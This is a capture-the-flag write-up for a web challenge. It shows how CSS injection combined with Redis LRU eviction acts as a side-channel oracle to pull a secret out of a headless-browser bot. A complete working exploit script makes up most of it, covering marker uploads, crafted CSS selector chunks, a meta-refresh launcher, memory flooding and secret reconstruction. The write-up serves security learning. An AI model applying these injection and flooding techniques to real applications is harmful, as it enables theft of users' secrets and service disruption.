---
title: "paper-2 — Redis LRU Side-Channel"
description: Exploiting Redis LRU eviction as an oracle to extract a secret through CSS injection, when CSP and network restrictions block conventional exfiltration.
tags: [ctf, web, xss, side-channel, css-injection, redis]
date: 2025-04-20
---

Let's first break down this program's logic and rough topography so we can better understand how it works.

## Understanding the challenge

The `docker-compose.yml` file spawns two containers for this challenge: one for Redis, and a Bun container used for hosting the challenge's server. The Dockerfile also pulls and installs Google Chrome to the container for use with Puppeteer.

Moving on to the program itself (`index.ts`):

- The server, running under Bun, sets up Chrome to:
  1. Block network prediction
  2. Accept a custom signed certificate for the host `paper`
  3. Fully block *any* outbound network request except to the `paper` host

  There are some other options passed to Chrome when it launches, but they aren't necessary for the solution of this challenge.

- The server exposes the following API to us:
  - `/upload` — makes a temporary file ("paper") that lasts 10 minutes
    - upper file size limit of ~65 kB
    - trusts the MIME type sent by the client
    - id increments over time
  - `/paper/:id` — returns the provided temp. file/paper with the given id
    - also trusts client's MIME type
  - `/secret` — responds with an HTML file with the secret attached to the HTML file's body as a prop and text value
    - takes in a payload string injected raw into the HTML file from search params
  - `/flag` — checks `secret` from the search params and returns the flag if it matches up
    - burns the secret from Redis when request is made, regardless of whether or not it is correct
  - `/visit/:id` — sends a bot (one per instance) to the passed paper id with the secret attached to the bot as a cookie

## The problem

The goal of this challenge is to pull and exfiltrate the flag (or the secret) from the bot, which is typical of an XSS challenge. However:

- CSP blocks JavaScript (we can't send any HTTP request we want)
- Chrome can only make network requests to the challenge server (can't send anything to a webhook server)

CSS injection allows us to send GET requests without any JavaScript at all. To upload papers to the server, we need to be able to send POST requests to the server, which is not possible under the constraints of CSS.

PDFs, when loaded under these strict CSP headers, fortunately open up PDFium. Chrome's default PDF viewer exposes a subset of the JavaScript API exposed to PDFs; there are many tech demos online utilizing this functionality, e.g. PDFDoom. While the exposed API allows us to send HTTP forms, there's no way to retrieve data from HTTP requests through the API surface made available to us, and the JS runs in a completely separate context and thread. The CSP blocks us from embedding PDF files inside of any response served by the `/paper` and `/secret` routes anyway, so this path likely isn't viable.

The lack of a direct method to exfiltrate the flag strongly suggests that it may be easier for us to seek a side-channel vulnerability instead.

## Digging deeper

Let's more carefully scrutinize how the challenge is set up. Going back to `docker-compose.yml`, the Redis server starts with a few interesting configuration options appended to its parameters:

- A memory cap of 512 megabytes (there's a finite amount of data we can squeeze in here)
- Key eviction policy `allkeys-lru` (least recently used keys are evicted when the memory limit is reached)

Let's recollect here. Abstracting away most of the details, here's what we know:

- We can upload any type of file we'd like as a paper, and fetch them as well without any rate limits
- We can have the bot read the secret and indirectly pull papers from the server (by CSS injection)
- The server evicts the least recently accessed papers when it runs out of memory

We can indirectly evict/delete files from Redis by selectively fetching the files that we want to keep before uploading new ones until the Redis server runs out of memory and removing old files.

CSS injection allows us to create conditional logic based on the secret's content (through selectors), which we can use to selectively make HTTP requests to the program that we can use to fetch arbitrary papers.

Using Redis' LRU eviction behavior as an oracle, we can extract the secret by:

1. Adding a bunch of "marker" paper files to store the key in the Redis database
   - Since the eviction behavior only tells us two possible states per byte (recently used or not recently used), one paper equates roughly to one file
   - The secret is a 16-byte-long hex string, so we need roughly 128 files to be able to represent all possible secrets ($32 \times 4$), which is achievable
2. Create a bunch of CSS rules that selectively send HTTP GET requests to fetch paper files depending on what characters are present in the secrets tag
3. Using the HTML meta tag to redirect the bot from the paper file to the secrets URL with our payload
4. Flooding the Redis database with bogus papers to force an eviction of the least-used secret paper markers
5. Attempt to read all the papers, and selectively find out which markers were evicted (and ones that stayed) to exfiltrate the randomly-generated secret

We're now ready to draft up a quick exploit script to test our theory.

## The solution

Actually writing up the solution was rather difficult, as:

1. **We had to switch to Bun halfway through** — `fetch()` under Node.js uses undici internally, and had some kind of connection pooling that made it impossible for the script to run fast enough to work.
2. **Network latency hindered remote reproducibility** — results were simply too inconsistent, and we had to slowly iterate by respawning the challenge instance to obtain a clean state each time.

The solve script is below. It uses Bun's concurrency primitives to flood the server with marker files, CSS chunks, and a launcher that drives the bot through the exploit chain.

<details>
<summary>Click to expand solve script</summary>

```js
#!/usr/bin/env bun

const HEX = '0123456789abcdef';
const BASE_URL = (process.env.BASE_URL || 'https://127.0.0.1:8443').replace(/\/$/, '');
const BOT_ORIGIN = (process.env.BOT_ORIGIN || BASE_URL).replace(/\/$/, '');

if (process.env.INSECURE === '1') {
  process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
}

const UPLOAD_CONCURRENCY = Number(process.env.UPLOAD_CONCURRENCY || 2048);
const PROBE_CONCURRENCY = Number(process.env.PROBE_CONCURRENCY || 4096);
const PREFILL_COUNT = Number(process.env.PREFILL_COUNT || 5600);
const POSTFILL_COUNT = Number(process.env.POSTFILL_COUNT || 2500);
const WAIT_AFTER_VISIT_MS = Number(process.env.WAIT_AFTER_VISIT_MS || 1000);
const REFRESH_COPIES = Number(process.env.REFRESH_COPIES || 2);
const RETRIES = Number(process.env.RETRIES || 2);
const LOG_EVERY = Number(process.env.LOG_EVERY || 4096);
const CSS_FILE_LIMIT = Number(process.env.CSS_FILE_LIMIT || 55000);
const BIG_RAW_SIZE = Number(process.env.BIG_RAW_SIZE || 60000);

const markerBlob = new Blob([Buffer.from([0x41])], { type: 'text/plain' });
const bigBlob = new Blob([Buffer.alloc(BIG_RAW_SIZE, 0x42)], { type: 'application/octet-stream' });

function log(message) {
  const now = new Date().toISOString().slice(11, 19);
  console.error(`[${now}] ${message}`);
}

function assert(ok, message) {
  if (!ok) throw new Error(message);
}

async function withRetries(fn) {
  let lastError = null;
  for (let attempt = 0; attempt < RETRIES; attempt += 1) {
    try { return await fn(); }
    catch (error) {
      lastError = error;
      if (attempt + 1 < RETRIES) await Bun.sleep(50 * (2 ** attempt));
    }
  }
  throw lastError;
}

async function mapLimit(items, limit, fn) {
  const out = new Array(items.length);
  let next = 0, done = 0;
  const workers = Array.from({ length: Math.min(limit, items.length) }, async () => {
    while (true) {
      const index = next++;
      if (index >= items.length) return;
      out[index] = await fn(items[index], index);
      done += 1;
      if (LOG_EVERY && done % LOG_EVERY === 0) log(`completed ${done}/${items.length}`);
    }
  });
  await Promise.all(workers);
  return out;
}

async function eachLimit(count, limit, fn) {
  let next = 0, done = 0;
  const workers = Array.from({ length: Math.min(limit, count) }, async () => {
    while (true) {
      const index = next++;
      if (index >= count) return;
      await fn(index);
      done += 1;
      if (LOG_EVERY && done % LOG_EVERY === 0) log(`completed ${done}/${count}`);
    }
  });
  await Promise.all(workers);
}

async function fetchWithRetry(url, options = {}) {
  return withRetries(() => fetch(url, options));
}

async function uploadBlob(blob, filename) {
  return withRetries(async () => {
    const form = new FormData();
    form.append('file', blob, filename);
    const res = await fetch(`${BASE_URL}/upload`, {
      method: 'POST',
      body: form,
      redirect: 'manual',
    });
    if (res.status !== 302) {
      throw new Error(`upload failed for ${filename}: ${res.status} ${await res.text()}`);
    }
    const location = res.headers.get('location') || '';
    const match = location.match(/\/paper\/([^/?#]+)/);
    if (!match) throw new Error(`missing location for ${filename}: ${location}`);
    return match[1];
  });
}

async function uploadMarkers(values, label) {
  log(`uploading ${values.length} ${label}`);
  return mapLimit(values, UPLOAD_CONCURRENCY, (_, index) =>
    uploadBlob(markerBlob, `${label}-${index}.txt`)
  );
}

async function uploadBurst(count, label) {
  log(`uploading ${count} ${label}`);
  await eachLimit(count, UPLOAD_CONCURRENCY, (index) =>
    uploadBlob(bigBlob, `${label}-${index}.bin`)
  );
}

async function uploadCssChunks(chunks) {
  log(`uploading ${chunks.length} css chunks`);
  return mapLimit(chunks, UPLOAD_CONCURRENCY, (css, index) => {
    const blob = new Blob([css], { type: 'text/css' });
    return uploadBlob(blob, `chunk-${index}.css`);
  });
}

async function paperExists(id) {
  const res = await fetchWithRetry(`${BASE_URL}/paper/${id}`);
  const body = Buffer.from(await res.arrayBuffer()).toString('utf8');
  return body !== 'not found!';
}

async function visit(id) {
  const res = await fetchWithRetry(`${BASE_URL}/visit/${id}`);
  const text = await res.text();
  if (res.status !== 200 || !text.includes('visiting')) {
    throw new Error(`/visit/${id} failed: ${res.status} ${text}`);
  }
}

async function guess(secret) {
  const res = await fetchWithRetry(`${BASE_URL}/flag?secret=${encodeURIComponent(secret)}`);
  return res.text();
}

function allKgrams(k) {
  const out = [];
  const recur = (prefix, depth) => {
    if (depth === k) { out.push(prefix); return; }
    for (const ch of HEX) recur(prefix + ch, depth + 1);
  };
  recur('', 0);
  return out;
}

function markerSpec(id) {
  const urls = [];
  for (let copy = 0; copy < REFRESH_COPIES; copy += 1) {
    urls.push(`url(/paper/${id}?r=${copy})`);
  }
  return urls.join(',');
}

function makeCssChunks(rules) {
  const chunks = [];
  let index = 0;

  function buildBase(chunkId, slots) {
    return `#c${chunkId}{display:block;width:1px;height:1px;background-image:${slots.map((slot) => `var(${slot},none)`).join(',')}}\n`;
  }

  while (index < rules.length) {
    const chunkId = chunks.length;
    const slots = [];
    const chunkRules = [];
    while (index < rules.length) {
      const slot = `--u${chunkId}_${slots.length}`;
      const rule = `${rules[index].selector}{${slot}:${rules[index].spec}}\n`;
      const nextText = buildBase(chunkId, slots.concat(slot)) + chunkRules.join('') + rule;
      if (nextText.length > CSS_FILE_LIMIT && slots.length > 0) break;
      slots.push(slot);
      chunkRules.push(rule);
      index += 1;
    }
    chunks.push(buildBase(chunkId, slots) + chunkRules.join(''));
  }
  return chunks;
}

function makeLauncher(cssIds) {
  const links = cssIds.map((id) => `<link rel="stylesheet" href="/paper/${id}">`).join('');
  const divs = cssIds.map((_, index) => `<div id="c${index}"></div>`).join('');
  const payload = `${links}${divs}`;
  return `<meta http-equiv="refresh" content="0;${BOT_ORIGIN}/secret?payload=${encodeURIComponent(payload)}">`;
}

function unique(values) { return [...new Set(values)]; }

function reconstruct(prefix3, suffix3, grams4, limit = 32) {
  const edges = new Map();
  for (const gram of grams4) {
    const src = gram.slice(0, 3);
    const next = gram[3];
    const list = edges.get(src) || [];
    list.push(next);
    edges.set(src, list);
  }

  const answers = [];
  function dfs(secret) {
    if (answers.length >= limit) return;
    if (secret.length === 32) {
      if (secret.endsWith(suffix3)) answers.push(secret);
      return;
    }
    const tail = secret.slice(-3);
    const choices = unique(edges.get(tail) || []);
    for (const ch of choices) {
      const next = secret + ch;
      const overlap = Math.max(0, next.length + suffix3.length - 32);
      if (overlap && next.slice(-overlap) !== suffix3.slice(0, overlap)) continue;
      dfs(next);
    }
  }

  dfs(prefix3);
  return unique(answers);
}

function reconstructFrom4Grams(grams4, limit = 4096) {
  const edges = new Map();
  const indegree = new Map();
  const outdegree = new Map();

  for (const gram of grams4) {
    const src = gram.slice(0, 3);
    const dst = gram.slice(1);
    const list = edges.get(src) || [];
    list.push(gram);
    edges.set(src, list);
    outdegree.set(src, (outdegree.get(src) || 0) + 1);
    indegree.set(dst, (indegree.get(dst) || 0) + 1);
  }

  const starts = unique(grams4.map((gram) => gram.slice(0, 3))).sort((a, b) => {
    const deltaA = (outdegree.get(a) || 0) - (indegree.get(a) || 0);
    const deltaB = (outdegree.get(b) || 0) - (indegree.get(b) || 0);
    if (deltaA !== deltaB) return deltaB - deltaA;
    return (outdegree.get(b) || 0) - (outdegree.get(a) || 0);
  });

  const answers = [];
  const used = new Set();

  function dfs(secret) {
    if (answers.length >= limit) return;
    if (secret.length === 32) { answers.push(secret); return; }
    const tail = secret.slice(-3);
    const choices = edges.get(tail) || [];
    for (const gram of choices) {
      if (used.has(gram)) continue;
      used.add(gram);
      dfs(secret + gram[3]);
      used.delete(gram);
    }
  }

  for (const start of starts) {
    dfs(start);
    if (answers.length >= limit) break;
  }
  return unique(answers);
}

function boundaryScore(candidate, prefixSet, suffixSet) {
  let score = 0;
  if (prefixSet.has(candidate.slice(0, 3))) score += 1;
  if (suffixSet.has(candidate.slice(-3))) score += 1;
  return score;
}

async function probeValues(values, ids, label) {
  log(`probing ${ids.length} ${label}`);
  const live = await mapLimit(ids, PROBE_CONCURRENCY, (id) => paperExists(id));
  return values.filter((_, index) => live[index]);
}

async function main() {
  const prefixes = allKgrams(3);
  const suffixes = allKgrams(3);
  const grams4 = allKgrams(4);

  log(`base=${BASE_URL} bot_origin=${BOT_ORIGIN}`);

  const gram4Ids = await uploadMarkers(grams4, 'gram4');
  const prefixIds = await uploadMarkers(prefixes, 'prefix3');
  const suffixIds = await uploadMarkers(suffixes, 'suffix3');

  const rules = [];
  for (let index = 0; index < grams4.length; index += 1) {
    rules.push({
      selector: `body[secret*="${grams4[index]}"]`,
      spec: markerSpec(gram4Ids[index]),
    });
  }
  for (let index = 0; index < prefixes.length; index += 1) {
    rules.push({
      selector: `body[secret^="${prefixes[index]}"]`,
      spec: markerSpec(prefixIds[index]),
    });
  }
  for (let index = 0; index < suffixes.length; index += 1) {
    rules.push({
      selector: `body[secret$="${suffixes[index]}"]`,
      spec: markerSpec(suffixIds[index]),
    });
  }

  const cssIds = await uploadCssChunks(makeCssChunks(rules));
  const launcherId = await uploadBlob(
    new Blob([makeLauncher(cssIds)], { type: 'text/html' }),
    'launcher.html',
  );
  log(`launcher id=${launcherId}`);

  await uploadBurst(PREFILL_COUNT, 'prefill');
  await visit(launcherId);
  await Bun.sleep(WAIT_AFTER_VISIT_MS);
  await uploadBurst(POSTFILL_COUNT, 'postfill');

  const [livePrefixes, liveSuffixes, live4Grams] = await Promise.all([
    probeValues(prefixes, prefixIds, 'prefix markers'),
    probeValues(suffixes, suffixIds, 'suffix markers'),
    probeValues(grams4, gram4Ids, '4-gram markers'),
  ]);

  log(`live prefix3=${livePrefixes.length} suffix3=${liveSuffixes.length} gram4=${live4Grams.length}`);

  const hardCandidates = unique(
    livePrefixes.flatMap((prefix3) =>
      liveSuffixes.flatMap((suffix3) => reconstruct(prefix3, suffix3, live4Grams, 2048)),
    ),
  );

  log(`hard reconstruction candidates=${hardCandidates.length}`);
  for (const candidate of hardCandidates) log(`candidate ${candidate}`);

  let candidates = hardCandidates;
  if (candidates.length === 0) {
    const prefixSet = new Set(livePrefixes);
    const suffixSet = new Set(liveSuffixes);
    const graphCandidates = reconstructFrom4Grams(live4Grams, 4096);
    log(`graph reconstruction candidates=${graphCandidates.length}`);
    const scored = graphCandidates
      .map((candidate) => ({ candidate, score: boundaryScore(candidate, prefixSet, suffixSet) }))
      .sort((a, b) => b.score - a.score);
    const bestScore = scored.length ? scored[0].score : -1;
    candidates = scored
      .filter((entry) => entry.score === bestScore)
      .map((entry) => entry.candidate);
    log(`graph best-score=${bestScore} candidates=${candidates.length}`);
    for (const candidate of candidates) log(`graph candidate ${candidate}`);
  }

  if (candidates.length === 0) throw new Error('reconstruction failed');
  if (candidates.length > 1) throw new Error('reconstruction was not unique');

  const flag = await guess(candidates[0]);
  if (flag === 'wrong' || flag === 'nice try') {
    throw new Error(`flag retrieval failed: ${flag}`);
  }

  console.log(flag);
}

main().catch((error) => {
  console.error(error.stack || String(error));
  process.exit(1);
});
```

</details>

## Related

- [[defcon-livectf-2026]], [[forensics-git-2]] — more CTF writeups
- [[cv]]
